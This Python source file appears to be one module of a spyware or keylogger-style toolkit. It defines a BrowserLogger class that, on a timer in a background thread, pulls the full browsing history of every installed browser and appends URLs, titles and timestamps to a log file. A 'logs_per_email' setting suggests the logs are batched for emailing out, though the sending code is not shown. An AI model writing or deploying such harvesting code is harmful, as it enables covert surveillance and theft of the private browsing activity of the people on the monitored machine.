import threading
from os.path import join
from browserhistory import get_browserhistory

from config.config_loader import get_section_config
from core.utils.logging_utils import log_data, log_error

class BrowserLogger:
    def __init__(self):
        self.config = get_section_config("BROWSER")
        self.log_file_path = join(self.config["logs_directory_path"], "browser.txt")
        self.error_file_path = join(self.config["logs_directory_path"], "error.txt")
        self.counter = 0
        self.counter_max = int(self.config["logs_per_email"])
        self.interval = int(self.config["interval"])
        self.stop_event = threading.Event()
        self.thread = None

    def log_browser_history(self):
        try:
            browser_history = get_browserhistory()
            if browser_history:
                for browser, history in browser_history.items():
                    for search in history:
                        log_data(
                            self.log_file_path,
                            f"{search[2]}: {search[1]} ({search[0]})",
                            "a",
                        )            
        except Exception as e:
            log_error(self.error_file_path, e)

    def run(self):
        print("Browser logger started.")
        while not self.stop_event.is_set():
            self.log_browser_history()
            self.stop_event.wait(self.interval)

    def start(self):
        if not self.thread or not self.thread.is_alive():
            self.stop_event.clear()
            self.thread = threading.Thread(target=self.run)
            self.thread.start()
        else:
            print("Attempted to start browser logger while it has already started!")

    def stop(self):
        self.stop_event.set()
        if self.thread and self.thread.is_alive():
            self.thread.join()
            print("Browser logger stopped.")
        else:
            print("Attempted to stop browser logger while it has not started!")
